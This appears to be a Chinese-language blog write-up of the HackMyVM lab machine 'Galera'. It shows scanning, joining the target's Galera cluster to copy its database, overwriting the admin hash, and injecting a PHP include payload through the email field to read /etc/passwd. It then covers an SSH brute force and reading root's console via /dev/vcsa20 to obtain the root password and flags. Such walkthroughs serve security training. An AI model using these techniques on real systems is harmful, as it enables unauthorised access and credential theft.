{"pageProps":{"postData":{"id":"HackMyVMGalera","contentHtml":"<h1>Galera.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Galera\">https://hackmyvm.eu/machines/machine.php?vm=Galera</a></p>\n</blockquote>\n<p>Notes：<strong>Galera is a challenge in which hackers must infiltrate a ...</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Galera nmap -sP 192.168.56.0/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-30 23:57 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00014s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00022s latency).\nMAC Address: 08:00:27:13:DD:59 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.66\nHost is up (0.00030s latency).\nMAC Address: 08:00:27:8F:84:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.5\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 27.98 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Galera nmap -sT -min-rate 10000 192.168.56.66\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-30 23:58 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.66\nHost is up (0.00081s latency).\nNot shown: 997 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n4567/tcp open  tram\nMAC Address: 08:00:27:8F:84:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 13.26 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Galera nmap -sT -A 192.168.56.66\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-31 00:00 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.66\nHost is up (0.00042s latency).\nNot shown: 997 closed tcp ports (conn-refused)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\n| ssh-hostkey:\n|   256 28:50:32:2f:bb:ef:7e:51:c3:59:cb:e6:40:88:0e:4e (ECDSA)\n|_  256 f3:fa:a1:84:c6:da:<span class=\"hljs-built_in\">fc</span>:09:fe:aa:ca:ec:0a:29:7d:30 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: Login\n|_http-server-header: Apache/2.4.62 (Debian)\n4567/tcp open  tram?\n| fingerprint-strings:\n|   GenericLines:\n|     )ALz\n|   GetRequest:\n|     ,6_V\n|   HTTPOptions:\n|_    N\\rjt\n....\nMAC Address: 08:00:27:8F:84:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nDevice <span class=\"hljs-built_in\">type</span>: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.42 ms 192.168.56.66\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 58.59 seconds\n</code></pre>\n<h2>4567 - Galera</h2>\n<p>扫描到一个没见过的端口，搜索引擎上线！！</p>\n<p><img src=\"/post-images/HackMyVMGalera/image.png\" alt=\"image.png\"></p>\n<p>可以看到搜索结果都是带着靶机的名字，所以该端口应该就是突破口</p>\n<p>通过了解后知道：Galera 复制是基于同步多源 <strong>MariaDB Galera集群</strong> </p>\n<blockquote>\n<p><a href=\"https://docs.redhat.com/zh-cn/documentation/red_hat_enterprise_linux/9/html/configuring_and_using_database_servers/replicating-mariadb-with-galera_using-mariadb\">https://docs.redhat.com/zh-cn/documentation/red_hat_enterprise_linux/9/html/configuring_and_using_database_servers/replicating-mariadb-with-galera_using-mariadb</a></p>\n</blockquote>\n<p><strong>MariaDB Galera 集群</strong> 的主要特性是 ：</p>\n<ul>\n<li>同步复制</li>\n<li>主动-主动多源拓扑</li>\n<li>对任何集群节点的读和写</li>\n<li>自动成员资格控制，故障节点从集群中删除</li>\n<li>自动节点加入</li>\n<li>行一级的并行复制</li>\n<li>直接客户端连接：用户可以登录到集群节点，并在复制运行时直接使用这些节点</li>\n</ul>\n<p>大概就是我们可以尝试将自己加入到集群中，然后就可以访问源数据库中的数据</p>\n<pre><code class=\"hljs language-bash\">➜  Galera <span class=\"hljs-built_in\">cp</span> /etc/mysql/mariadb.conf.d/60-galera.cnf /etc/mysql/mariadb.conf.d/60-galera.cnf.bak\n</code></pre>\n<p>根据<code>GPT</code>生成的配置（将需要指定的配置全都删掉了）</p>\n<pre><code class=\"hljs language-bash\">[galera]\nwsrep_on = ON\nwsrep_provider = /usr/lib/galera/libgalera_smm.so\nwsrep_cluster_address = <span class=\"hljs-string\">\"gcomm://192.168.56.66:4567\"</span>\nwsrep_node_name = <span class=\"hljs-string\">\"sunset\"</span>\nwsrep_node_address = <span class=\"hljs-string\">\"192.168.56.5\"</span>     <span class=\"hljs-comment\"># 本机IP</span>\nbinlog_format = row\ndefault_storage_engine = InnoDB\nwsrep_sst_method = rsync\nbind-address = 0.0.0.0\n</code></pre>\n<p>重启数据库</p>\n<pre><code class=\"hljs language-bash\">➜  Galera systemctl restart mariadb\n</code></pre>\n<p>然后登录进去数据库，能看到同步过来了<code>galeradb</code> 数据库</p>\n<pre><code class=\"hljs language-bash\">➜  Galera mysql -uroot -p\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection <span class=\"hljs-built_in\">id</span> is 9\nServer version: 11.8.1-MariaDB-4 Debian n/a\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nSupport MariaDB developers by giving a star at https://github.com/MariaDB/server\nType <span class=\"hljs-string\">'help;'</span> or <span class=\"hljs-string\">'\\h'</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">help</span>. Type <span class=\"hljs-string\">'\\c'</span> to clear the current input statement.\n\nMariaDB [(none)]> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| galeradb           |\n| information_schema |\n| mysql              |\n| performance_schema |\n| sys                |\n+--------------------+\n5 rows <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (0.006 sec)\n\nMariaDB [(none)]> \n</code></pre>\n<p>能找到用户表</p>\n<pre><code class=\"hljs language-bash\">MariaDB [galeradb]> <span class=\"hljs-keyword\">select</span> * from <span class=\"hljs-built_in\">users</span>;\n+----+----------+------------------+--------------------------------------------------------------+---------------------+\n| <span class=\"hljs-built_in\">id</span> | username | email            | password                                                     | created_at          |\n+----+----------+------------------+--------------------------------------------------------------+---------------------+\n|  1 | admin    | admin@galera.hmv | $2y$10<span class=\"hljs-variable\">$BCAQ6VSNOL9TzfE5</span>/dnVmuc9R5PotwClWAHwRdRAt7RM0d9miJRzq | 2025-05-05 07:55:51 |\n+----+----------+------------------+--------------------------------------------------------------+---------------------+\n1 row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (0.002 sec)\n</code></pre>\n<p>我们不爆破了，直接更新其密码</p>\n<p><img src=\"/post-images/HackMyVMGalera/image1.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">MariaDB [galeradb]> update <span class=\"hljs-built_in\">users</span> <span class=\"hljs-built_in\">set</span> password = <span class=\"hljs-string\">'$2a$10$xxFez17bX.RtTFPdER3.P.KmUtS6XYxkOrbXH7p65WzB4H2AFQpCi'</span> <span class=\"hljs-built_in\">where</span> username = <span class=\"hljs-string\">'admin'</span>;\nQuery OK, 1 row affected (0.004 sec)\nRows matched: 1  Changed: 1  Warnings: 0\n</code></pre>\n<h2>Web 渗透</h2>\n<p>更新密码后，我们的到了新的用户，应该是在<code>Web</code> 上能用上的</p>\n<p>访问 <code>80</code> 端口</p>\n<p><img src=\"/post-images/HackMyVMGalera/image2.png\" alt=\"image.png\"></p>\n<p>存在登录框，我们使用刚刚得到的用户进行登录</p>\n<p>成功进入到后台，后台是有一个能发布信息的功能，但是貌似没什么用处</p>\n<p><img src=\"/post-images/HackMyVMGalera/image3.png\" alt=\"image.png\"></p>\n<p>先对其进行目录扫描</p>\n<pre><code class=\"hljs language-bash\">➜  Galera feroxbuster --url http://192.168.56.66 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --filter-status 404,403 -x php,zip,txt\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben <span class=\"hljs-string\">\"epi\"</span> Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://192.168.56.66\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 403]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ <span class=\"hljs-literal\">true</span>\n 💲  Extensions            │ [php, zip, txt]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET       62l      115w     1055c http://192.168.56.66/style.css\n200      GET       26l       57w      825c http://192.168.56.66/index.php\n302      GET        0l        0w        0c http://192.168.56.66/login.php => http://192.168.56.66/\n301      GET        9l       28w      315c http://192.168.56.66/upload => http://192.168.56.66/upload/\n200      GET    10495l    65816w  5238944c http://192.168.56.66/galera.png\n200      GET       26l       57w      825c http://192.168.56.66/\n200      GET      861l     4482w    77306c http://192.168.56.66/info.php\n302      GET        0l        0w        0c http://192.168.56.66/logout.php => index.php\n200      GET        0l        0w        0c http://192.168.56.66/config.php\n[####################] - 4m   1764404/1764404 0s      found:9       errors:2\n[####################] - 4m    882184/882184  3335/s  http://192.168.56.66/\n[####################] - 4m    882184/882184  3314/s  http://192.168.56.66/upload/\n</code></pre>\n<p>访问 <code>info.php</code> ，是 <code>phpinfo()</code>的输出</p>\n<p><img src=\"/post-images/HackMyVMGalera/image4.png\" alt=\"image.png\"></p>\n<p>也没拿到什么有用的信息</p>\n<p>本来想测试 <code>Message</code> 的信息会不会写入表中然后同步，但是也并没有</p>\n<p>然后可以注意到，后台中输出的用户信息只有用户的邮箱，因此这里可能会存在注入或者 PHP 代码执行等漏洞，我们对其进行<code>Fuzz</code> ，最后发现其可以解析 <code>PHP</code>语句</p>\n<pre><code class=\"hljs language-bash\">MariaDB [galeradb]> <span class=\"hljs-keyword\">select</span> * from <span class=\"hljs-built_in\">users</span>;\n+----+----------+----------------------+--------------------------------------------------------------+---------------------+\n| <span class=\"hljs-built_in\">id</span> | username | email                | password                                                     | created_at          |\n+----+----------+----------------------+--------------------------------------------------------------+---------------------+\n|  1 | admin    | &#x3C;?php <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"test\"</span>;?> | $2a$10<span class=\"hljs-variable\">$xxFez17bX</span>.RtTFPdER3.P.KmUtS6XYxkOrbXH7p65WzB4H2AFQpCi | 2025-05-05 07:55:51 |\n+----+----------+----------------------+--------------------------------------------------------------+---------------------+\n1 row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (0.001 sec)\n</code></pre>\n<p><img src=\"/post-images/HackMyVMGalera/image5.png\" alt=\"image.png\"></p>\n<p>但是从之前 <code>phpinfo</code> 的信息中能看到有很多限制，基本都<code>ban</code>掉了</p>\n<p><img src=\"/post-images/HackMyVMGalera/image6.png\" alt=\"image.png\"></p>\n<p>虽然给禁用了很多的命令执行函数，可以尝试绕过</p>\n<p>我们再看一下伪协议</p>\n<p><img src=\"/post-images/HackMyVMGalera/image7.png\" alt=\"image.png\"></p>\n<p>读取文件的伪协议没有被禁用</p>\n<pre><code class=\"hljs language-bash\">&#x3C;?php include(<span class=\"hljs-string\">'php://filter/convert.base64-encode/resource=/etc/passwd'</span>);?>\n</code></pre>\n<pre><code class=\"hljs language-bash\">MariaDB [galeradb]> update <span class=\"hljs-built_in\">users</span> <span class=\"hljs-built_in\">set</span> email = <span class=\"hljs-string\">\"&#x3C;?php include('php://filter/convert.base64-encode/resource=/etc/passwd');?>\"</span> <span class=\"hljs-built_in\">where</span> username = <span class=\"hljs-string\">'admin'</span>;\nQuery OK, 1 row affected (0.006 sec)\nRows matched: 1  Changed: 1  Warnings: 0\n</code></pre>\n<p>成功读取</p>\n<p><img src=\"/post-images/HackMyVMGalera/image8.png\" alt=\"image.png\"></p>\n<p>解码后发现一个新用户 <code>donjuandeaustria</code></p>\n<p><img src=\"/post-images/HackMyVMGalera/image9.png\" alt=\"image.png\"></p>\n<h2>Hydra</h2>\n<p>拿<code>shell</code>很麻烦，所以我直接超级爆破</p>\n<p>一段时间后密码就出来了 <strong><code>amorcito</code></strong></p>\n<p><img src=\"/post-images/HackMyVMGalera/image10.png\" alt=\"image.png\"></p>\n<p>登录进去后能读取 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">donjuandeaustria@galera:~$ <span class=\"hljs-built_in\">ls</span>\ndonjuandeaustria.png  user.txt\n\ndonjuandeaustria@galera:~$ <span class=\"hljs-built_in\">cat</span> user.txt \n072f9d8c26547db59e65d7aa3e55747b\n</code></pre>\n<h2>提权</h2>\n<p>当前目录下还有一张图片，尝试从文件中截取数据</p>\n<pre><code class=\"hljs language-bash\">➜  Galera binwalk donjuandeaustria.png \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 1024 x 1024, 8-bit/color RGB, non-interlaced\n1195          0x4AB           Certificate <span class=\"hljs-keyword\">in</span> DER format (x509 v3), header length: 4, sequence length: 819\n2021          0x7E5           Certificate <span class=\"hljs-keyword\">in</span> DER format (x509 v3), header length: 4, sequence length: 1146\n14398         0x383E          JPEG image data, JFIF standard 1.02\n65084         0xFE3C          Certificate <span class=\"hljs-keyword\">in</span> DER format (x509 v3), header length: 4, sequence length: 819\n65910         0x10176         Certificate <span class=\"hljs-keyword\">in</span> DER format (x509 v3), header length: 4, sequence length: 1146\n78457         0x13279         Zlib compressed data, default compression\n</code></pre>\n<p>没有收获，继续寻找</p>\n<p>发现 <code>root</code> 用户登录在 <code>tty20</code> 中</p>\n<pre><code class=\"hljs language-bash\">donjuandeaustria@galera:/dev$ <span class=\"hljs-built_in\">users</span> \ndonjuandeaustria root\ndonjuandeaustria@galera:/dev$ <span class=\"hljs-built_in\">who</span>\nroot     tty20        2025-05-31 05:45\ndonjuandeaustria pts/0        2025-05-31 07:47 (192.168.56.5)\n</code></pre>\n<p>并且我们属于 <code>tty</code> 组</p>\n<pre><code class=\"hljs language-bash\">donjuandeaustria@galera:/dev$ <span class=\"hljs-built_in\">id</span>\nuid=1000(donjuandeaustria) gid=1000(donjuandeaustria) <span class=\"hljs-built_in\">groups</span>=1000(donjuandeaustria),5(<span class=\"hljs-built_in\">tty</span>),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(<span class=\"hljs-built_in\">users</span>),106(netdev)\n</code></pre>\n<p>我们直接查看 <code>root</code> 用户的终端内容</p>\n<pre><code class=\"hljs language-bash\">donjuandeaustria@galera:/dev$ <span class=\"hljs-built_in\">cat</span> vcsa20\n</code></pre>\n<p>其中部分能得到 <code>root</code> 密码</p>\n<pre><code class=\"hljs language-bash\">Reminder: your root password is <span class=\"hljs-string\">'saG58zJxs8crgQa366Uw'</span>  \n</code></pre>\n<p><code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">root@galera:~# <span class=\"hljs-built_in\">cat</span> root.txt\n6a0d424c13321ca6e3b2deb2295fcc26\n</code></pre>","title":"HackMyVM - Galera","date":"2025-05-31","updated":"2025-05-31","tags":["HackMyVM","Linux靶机","Gelera","tty","SQLinjection"],"categories":"靶机","comments":true},"recentPosts":[{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Season8 - Artificial","date":"2025-06-28","isEncrypted":true,"year":"2025","month":"06","day":"28"},{"id":"HackTheBoxMachine - Developer","title":"HackTheBox - Machine - Developer","date":"2025-06-22","isEncrypted":false,"year":"2025","month":"06","day":"22"},{"id":"HackTheBoxMachine - TwoMillion","title":"HackTheBox - Machine - TwoMillion","date":"2025-06-21","isEncrypted":false,"year":"2025","month":"06","day":"21"},{"id":"群U靶机Tools","title":"群U靶机 - Tools","date":"2025-06-16","isEncrypted":false,"year":"2025","month":"06","day":"16"},{"id":"HackTheBoxMachine - Ellingson","title":"HackTheBox - Machine - Ellingson","date":"2025-06-15","isEncrypted":false,"year":"2025","month":"06","day":"15"},{"id":"PWN - 基本ROP","title":"PWN - 基本ROP","date":"2025-06-14","isEncrypted":false,"year":"2025","month":"06","day":"15"},{"id":"HackTheBoxMachine - Cap","title":"HackTheBox - Machine - Cap","date":"2025-06-11","isEncrypted":false,"year":"2025","month":"06","day":"11"}]},"__N_SSG":true}